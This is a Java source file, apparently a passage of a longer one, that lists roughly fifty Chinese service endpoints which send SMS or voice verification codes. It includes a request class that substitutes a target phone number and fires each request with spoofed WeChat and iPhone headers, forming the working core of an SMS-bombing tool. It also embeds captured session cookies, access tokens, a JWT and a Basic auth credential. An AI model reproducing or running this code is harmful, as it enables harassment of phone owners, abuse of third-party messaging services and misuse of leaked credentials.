        addGet("https://www.ruijie.com.cn/application/api/m/sms/send?phone={phone}");

        // API 92
        addGet("https://nf.video/8081/api/auth/get/phone/code?phone={phone}&cid=86");

        // API 93
        addGet("https://applet.mbadashi.com/appletapi/applet/authorizations/smscode?mobile={phone}");

        // API 94
        addGet("https://next.gacmotor.com/mall/center-current-app/login/sendMsg/{phone}");

        // API 95
        addGet("https://zybackendf-prod.myquanyi.com/sendverifycode/sendverifycode?_platform_num=153635&mobile={phone}&bus_id=101&tem_id=1001");

        // API 96
        addGet("https://great.minxundianzi.com/greatweb/great/user/sendSmsCode?countryCode=86&userTel={phone}&type=1");

        // API 97
        addGet("https://aiyidaijia.kuaimazhixing.com/frontapi/oeapi/prelogin?sig=81777b886918c47d1316d2a5215c2d&appkey=61000211&from=02050060&udid=oLX9N5V-3Ml1EZVcqFr0fg1wERSE&from_type=mini&app_ver=9.6.0&ver=3.4.3&os=windows&source=5&wxAppId=wxb46d03964eecda54&current_city_id=410500&phone={phone}&business=edaijia_");

        // API 98
        addGet("https://fyxrd.168fb.cn/master_renda/public/api/Login/sendsms?phone={phone}&user_type=2");

        // API 99
        addGet("http://user.sanwan.club/push/verificationCode/send?phone={phone}&useSms=true");

        // API 101
        addGet("https://dss.xiongmaopeilian.com/student_wx/student/send_sms_code?country_code=86&mobile={phone}");

        // API 102
        addGet("https://12345.scncggzy.com.cn/wx/auth/sendVerificationCode.json?mobile={phone}");

        // API 103
        addGet("https://apis.niuxuezhang.cn/v1/sms-code?phone={phone}");

        // API 104
        addGet("https://uc.17win.com/sms/v4/web/verificationCode/send?mobile={phone}&scene=bind&isVoice=N&appId=08100110010000");

        // API 105
        addGet("https://wccy-server.sxlyb.com/open/v1/login-code/{phone}?phone={phone}");

        // API 106
        addGet("https://m.ehaier.com/v3/platform/sms/getSmsCode.json?mobile={phone}&type=login");

        // API 107
        addGet("https://wechat.hfmlgy.com/wechat/set/{phone}/QFKJ10001");

        // API 108
        addGet("https://mapi.ekwing.com/parent/user/sendcode?scenes=login&tel={phone}&v=9.0&os=Windows");

        // API 109
        addGet("https://qxt.matefix.cn/api/wx/common/sendMsgCode?mobile={phone}");

        // API 110
        addGet("https://test.ccsc58.com/send_code?phone={phone}&action=regist");

        // API 111
        addGet("https://api.lanniao.com/workerApi/index/sendIdentifySms/{phone}");

        // API 112
        addGet("https://bb.hzbeiyang.com/platform/sms/register/V2?mobile={phone}&xcxAppId=wxa663a58156eb05b2");

        // API 113
        addGet("https://m-api.rocketbird.cn/mobile/Index/sendSmsCode?v=1.3.2&phone={phone}&m_openid=o1wsW0eE8ynJnniLNeVartjr3c-s");

        // API 114
        addForm("https://api.paozhengtong.com/notarize/user/sendMessage")
                .header("Host", "api.paozhengtong.com")
                .header("scene", "pzt_weixin_0.0.116")
                .header("appid", "wx4d68f497875d7e2c")
                .header("checkSumDTO", "{\"appid\":\"20200924001\",\"nonce\":\"554360341071\",\"curtime\":\"1712223908000\",\"checksum\":\"a9ed7bdc8734b150333b59ca005d62082074365f\"}")
                .header("Referer", "https://servicewechat.com/wx4d68f497875d7e2c/33/page-frame.html")
                .body("phone={phone}");

        // API 115
        addForm("https://api.9tax.com/newspaper/user/sendMessage")
                .header("Host", "api.9tax.com")
                .header("scene", "pzt_weixin_0.0.116")
                .header("system", "{\"model\":\"microsoft\",\"appName\":\"wxe1f61a425eaae0b8\",\"system\":\"Windows 10 x64\"}")
                .header("appid", "wx86f84c798cfb9a6b")
                .header("Referer", "https://servicewechat.com/wx86f84c798cfb9a6b/21/page-frame.html")
                .body("phone={phone}");

        // API 116
        addForm("https://m.midea.cn/next/user_assist/getmobilevc")
                .header("Host", "m.midea.cn")
                .header("X-Wx-Version", "3.9.6/3.4.1")
                .header("X-Wx-Appid", "wxa13e96304985b75d")
                .header("Cookie", "midea_mk=486649a8b67c920c3134dd81ed1e3aa;plt=wxsapp;appname=weapp_fx_r")
                .header("X-Wx-Ref", "pages/login/login")
                .header("Referer", "https://servicewechat.com/wxa13e96304985b75d/158/page-frame.html")
                .body("scene=terminal_shop&mobile={phone}");

        // API 117
        addJson("https://api.shengtuanyouxuan.com/mini/life/v1/captcha/getCaptcha")
                .header("Host", "api.shengtuanyouxuan.com")
                .header("mini-type", "miniLife")
                .header("mini-version", "2.4.5")
                .header("sign", "QKwUegAfSGGrcQyas7TsB4uCP78=")
                .header("Referer", "https://servicewechat.com/wx97e0a0a3ea2f4154/11/page-frame.html")
                .body("{\"phone\": \"{phone}\", \"bizCode\": \"miniBindPhone\"}");

        // API 118
        addForm("https://web.tlawyer.cn/account/sendsmsregister")
                .header("Host", "web.tlawyer.cn")
                .header("Origin", "https://web.tlawyer.cn")
                .header("Referer", "https://web.tlawyer.cn/account/reg?ref=/app/ask/lhxy")
                .header("Cookie", "_app=lhxy; _user_sid=bqe43fdvv5lievv4ravjd5v0")
                .body("phone={phone}");

        // API 122
        addForm("https://passport.xag.cn/home/sms_code")
                .header("Host", "passport.xag.cn")
                .header("mini", "member")
                .header("Authorization", "Basic QTFDQ0FFOUItNjcwMi0wOUY4LTVDNjUtOTM3M0ZEQkY4OTY4OjNhYzcxNjk2OGM0NzlmMmMzZTVhYjc1MjQ2OTYyMWJi")
                .header("token", "")
                .header("Referer", "https://servicewechat.com/wx43471742f3e783cb/213/page-frame.html")
                .body("icc=86&phone={phone}");

        // API 123
        addForm("https://m-sqhlwyy.panyu.gd.cn/med/gateway/640009/ytGateway")
                .header("Host", "m-sqhlwyy.panyu.gd.cn")
                .header("SRType", "wechat")
                .header("yt-h5url", "/packages/login_with_phone/index")
                .header("SRKey", "panyu")
                .header("X-WX-Model", "microsoft")
                .header("Cookie", "connect.sid=s:jvqIK7Zaee0wu5JbSuZZ8sDhjMo3IR0f.b0SnJDCKgOHw2fmQVXxjPzQpLNRk%2B8HWTj3o2LX1BU0")
                .header("version", "89.1.0")
                .header("Referer", "https://servicewechat.com/wx6b114e41079b7388/3/page-frame.html")
                .body("api_name=/r/10001/103@udb3&phoneNo={phone}");

        // API 124
        addForm("https://fcm2-5.ocj.com.cn/api/newMedia/login/mini/login/securityCode")
                .header("Host", "fcm2-5.ocj.com.cn")
                .header("X-media", "03")
                .header("X-media-channel", "6")
                .header("X-chl-code", "3")
                .header("X-msale-platform", "SP")
                .header("X-msale-code", "MM")
                .header("X-msale-way", "AMM")
                .header("X-source", "SPG")
                .header("X-chain-id", "")
                .header("Referer", "https://servicewechat.com/wx7e98237a4154ffc7/110/page-frame.html")
                .body("phone={phone}&purpose=quick_register_context");

        // API 125
        addForm("https://api.cdfsunrise.com/restapi/user/sendMobileCode")
                .header("Host", "api.cdfsunrise.com")
                .header("AppVersion", "1.29.6")
                .header("MiniApp", "weapp")
                .header("mobile", "")
                .header("showLoading", "[object Boolean]")
                .header("UserSystem", "WeChat")
                .header("OsVersion", "10")
                .header("device", "")
                .header("openid", "")
                .header("ClientNetwork", "wifi")
                .header("headers", "[object Object]")
                .header("OS", "unknown")
                .header("UnionId", "")
                .header("DeviceId", "DCB544E2087CEE28-A0B923820DCC509A-253638247")
                .header("accessToken", "WyI5MjlFNUUyQ0Q4RjkxRDlCLUEwQjkyMzgyMERDQzUwOUEtMjE0NDMyNzEzIiwiOTI5RTVFMkNEOEY5MUQ5Qi1BMEI5MjM4MjBEQ0M1MDlBLTIxNDQzMjcxMyJd;0;ZXlKMGVYQmxJam9pZEdGeWIxOTNaV0Z3Y0NJc0ltMXZaR1ZzSWpvaWJXbGpjbTl6YjJaMElpd2ljM2x6ZEdWdElqb2lWMmx1Wkc5M2N5QXhNQ0I0TmpRaUxDSmhjSEJmYm1GdFpTSTZJbXhsWm05NExXOW1abWxqYVdGc0xXMXBibWx3Y205bmNtRnRJaXdpZG1WeWMybHZiaUk2SWpFdU1qa3VOaUlzSW5ObGNtbGhiRTVQSWpvaWIxOWxNMm8wYkU1cmIxaDZaVGxXWWtSeVdIRXlSMll4YVVwbmF5SXNJbUZqWTI5MWJuUkpSQ0k2SWpreU9VVTFSVEpEUkRoR09URkVPVUl0UVRCQ09USXpPREl3UkVORE5UQTVRUzB5TVRRME16STNNVE1pTENKemFXZHVJam9pWm1FeU1XVmpPV1l3WW1VMk1qQXdaakZtWVRNek5EbGhPVGt6WkRJMk9XRWlmUT09;Ym5Wc2JBbz0=;;W10=;240d8fe412d77294dfdef557cd30de9d34b6c5a95b2642656419d620503ffb53ae2d23eb8d1de7a0afb165aa181e35c6786d9ae8f2ac137f8fd7d39051e6cfc1")
                .header("Referrer-Policy", "origin")
                .header("alipayopenid", "")
                .header("deviceModel", "microsoft")
                .header("Referer", "https://servicewechat.com/wx82028cdb701506f3/181/page-frame.html")
                .body("mobileCodeType=mobileLogin&mobileNo={phone}&sign=md5sign&timeStamp=1713177231575&deviceId=Bkm9UNmPJJnDQ+JUmFhfc+gHKSId9U/vXW6S1Fremx0ex4JnwRIcgGva0jXeA1hFmgCHgjsSYh1ZcYUwXv+tufw==&rid=");

        // API 126
        addForm("https://vipainisheng.com/user/app/open/user/sendSms")
                .header("Host", "vipainisheng.com")
                .header("loginDevictType", "XCX")
                .header("cookie", "")
                .header("Referer", "https://servicewechat.com/wx5f198a7cd2798103/8/page-frame.html")
                .body("jmxygtz=&vcVersionCode=1.6.2&language=zh_CN&loginDevictType=XCX&appCode=JS&xcxAppId=wx5f198a7cd2798103&mobile={phone}&affairType=1&area=+86&en=Hf5FRgv5tjYBW5FIgJG6Mpp94VaqgFNVugxYQks0Us67L2ujaFcjOWRMVj1V4swL/rVe5ADkyXimIJ53T194Fg==&uuid=&captchaCode=");

        // API 127
        addJson("https://mobilev2.atomychina.com.cn/api/user/web/login/login-send-sms-code")
                .header("Host", "mobilev2.atomychina.com.cn")
                .header("cookie", "acw_tc=0b6e702e17131629263394156e104b9681bb7f7854d38d5dfc0dff560ade54; guestId=01e7996e-454f-4bab-bd84-44b6d2277113; 15 Apr 2025 06:35:26 GMT; guestId.sig=jWFSrGBOhFwEfFZJbEoMSYkDoO8; 15 Apr 2025 06:35:50 GMT; 15 Apr 2025 06:35:52 GMT")
                .header("Referer", "https://servicewechat.com/wx74d705d9fabf5b77/97/page-frame.html")
                .body("{\"mobile\": \"{phone}\", \"captcha\": \"1111\", \"token\": \"1111\", \"prefix\": 86}");

        // API 128
        addGet("https://user.yunjiglobal.com/yunjiuserapp/userapp/generateVoiceSmsCode.json?phone=86{phone}&appCont=1");

        // API 129
        addJson("https://community.lishuizongzhi.com/wx-life/mc/auth/code")
                .header("Host", "community.lishuizongzhi.com")
                .header("accesstoken", "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJvcGVuSWQiOiJvOHpBNjVibzFVMDhwdGlxRkJTMmd0VGgwaTZBIiwiYXBwSWQiOiJ3eDI4ZWUyYjdlYzExOTFjMzEiLCJsb2dpblRpbWUiOjE3MTExOTIwNzAyOTd9.m2nzRIQMVmcET1VuyYJLmuTjZtuTAUwY1QwZSnVX0RM")
                .header("Referer", "https://servicewechat.com/wx28ee2b7ec1191c31/20/page-frame.html")
                .body("{\"phone\": \"{phone}\"}");

        // API 130
        addGet("https://card.10010.com/ko-order/messageCaptcha/send?phoneVal={phone}");

        // API 131
        addGet("https://igetcool-gateway.igetcool.com/app-api-user-server/white/sms/voice.json?phone={phone}&smstype=1");

        // API 132
        addGet("https://delivery-api.imdada.cn/v2_0/account/sendVoiceSMSCode/?phone={phone}&type=2");

        // API 133
        addForm("https://api-smart.ddzuwu.com/api/users/login/send-sms")
                .header("Host", "api-smart.ddzuwu.com")
                .header("User-Agent", "dingdongzuwu/2.8.7 (iPhone; iOS 16.6.1; Scale/2.00)")
                .body("phone={phone}");

        // API 134
        addJson("https://api.boxtrip.vip/v1/api/sms/login")
                .header("Host", "api.boxtrip.vip")
                .header("platform", "ios")
                .header("signature", "2143352315")
                .header("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app")
                .body("{\"mobile\": \"{phone}\"}");

        // API 135
        addJson("https://anmo.jiudiananmo.com/index.php?i=666&t=0&v=3.0&from=wxapp&c=entry&a=wxapp&do=api&core=core2&m=longbing_massages_city&s=massage/app/Index/sendShortMsg&urls=massage/app/Index/sendShortMsg")
                .header("Host", "anmo.jiudiananmo.com")
                .header("market", "8")
                .header("isapp", "1")
                .header("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app")
                .body("{\"phone\": \"{phone}\"}");

        // API 136
        addJson("https://api.dingdong.lrswlkj.com/auth/sendLoginMobileCode")
                .header("Host", "api.dingdong.lrswlkj.com")
                .header("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app")
                .body("{\"mobile\": \"{phone}\", \"type\": 0}");

        // API 137
        addJson("https://mgr.moyunk.com/api/appAuth/smsCode")
                .header("Host", "mgr.moyunk.com")
                .header("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app")
                .body("{\"mobile\": \"{phone}\"}");

        // API 138
        addJson("https://api.jishizhijia.com/technician-home/login/sendMsg")
                .header("Host", "api.jishizhijia.com")
                .header("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app")
                .body("{\"tel\": \"{phone}\"}");

        // API 139
        addJson("https://api.tuituidj.com/h5/customer/loginSms")
                .header("Host", "api.tuituidj.com")
                .header("system", "ios")
                .header("channel", "")
                .header("version", "1033")
                .header("platform", "APP")
                .header("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app")
                .body("{\"phone\": \"{phone}\"}");

        // API 140
        addForm("https://api.meipao.vip/make_rider/v1/send_provider_sms")
                .header("Host", "api.meipao.vip")
                .header("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app")
                .header("Authorization", "bearer undefined")
                .body("mobile={phone}&type=rider_login&m=make_rider&uniacid=0");

        // API 141
        addJson("https://open.iconntech.com/unifyUser/sendMsg")
                .header("Host", "open.iconntech.com")
                .header("User-Agent", "HZCitizenCardapp/6.7.6 (iPhone; iOS 16.6.1; Scale/2.00)")
                .body("{\"msgType\": \"01\", \"mobile\": \"{phone}\"}");

        // API 142
        addJson("https://app.dianjingjob.com/api/v1/5f8aa4831930c")
                .header("Host", "app.dianjingjob.com")
                .header("appid", "91562284")
                .header("timestamp", "1714822056")
                .header("signaturenonce", "6f2fda6d4a10c1ee6373a33ff46637f8a1fa4929")
                .header("signature", "a4ae58d89f0df0e7166be4371c0b2d944f4699d9")
                .header("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app")
                .body("{\"is_test\": 0, \"mobile\": \"{phone}\", \"type\": \"1\"}");

        // API 143
        addJson("https://xnvfgk.sjrjyffs.top/api/app/sms/getcode")
                .header("Host", "xnvfgk.sjrjyffs.top")
                .header("userType", "app_user")
                .header("User-Agent", "GGTravelGuide/1.2.8 (com.TravelGuide.success; build:1; iOS 16.6.1) Alamofire/5.7.1")
                .header("Authorization", "Bearer noToken")
                .body("{\"systemType\": 4, \"phonenumber\": \"{phone}\"}");

    }

    private ApiTask addJson(String url) {
        ApiTask task = new ApiTask(url, "POST", true);
        apiTasks.add(task);
        return task;
    }

    private ApiTask addForm(String url) {
        ApiTask task = new ApiTask(url, "POST", false);
        apiTasks.add(task);
        return task;
    }

    private ApiTask addGet(String url) {
        ApiTask task = new ApiTask(url, "GET", false);
        apiTasks.add(task);
        return task;
    }

    private class ApiTask {
        String url;
        String method;
        Map<String, String> headers = new HashMap<>();
        String bodyTemplate;
        boolean isJson;

        public ApiTask(String url, String method, boolean isJson) {
            this.url = url;
            this.method = method;
            this.isJson = isJson;
            headers.put("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555");
            headers.put("Accept", "*/*");
            headers.put("Connection", "keep-alive");
            if (isJson && method.equals("POST")) {
                headers.put("Content-Type", "application/json");
            } else if (!isJson && method.equals("POST")) {
                headers.put("Content-Type", "application/x-www-form-urlencoded");
            }
        }

        public ApiTask header(String key, String value) {
            headers.put(key, value);
            return this;
        }

        public ApiTask body(String bodyTemplate) {
            this.bodyTemplate = bodyTemplate;
            return this;
        }

        public boolean execute(String phoneNumber) {
            try {
                String finalUrl = url.replace("{phone}", phoneNumber);

                URL urlObj = new URL(finalUrl);
                HttpURLConnection conn = (HttpURLConnection) urlObj.openConnection();
                conn.setRequestMethod(method);
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);

                if (method.equals("POST")) {
                    conn.setDoOutput(true);
                }

                for (Map.Entry<String, String> entry : headers.entrySet()) {
                    conn.setRequestProperty(entry.getKey(), entry.getValue());
                }

                if (bodyTemplate != null && method.equals("POST")) {
                    String body = bodyTemplate.replace("{phone}", phoneNumber);
                    try (OutputStream os = conn.getOutputStream()) {
                        os.write(body.getBytes(StandardCharsets.UTF_8));
                    }
                }

                int code = conn.getResponseCode();
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                    while (reader.readLine() != null) {
                    }
                } catch (Exception ignored) {
                }

                return code == 200;
            } catch (Exception e) {
                return false;
            }
        }
    }
}
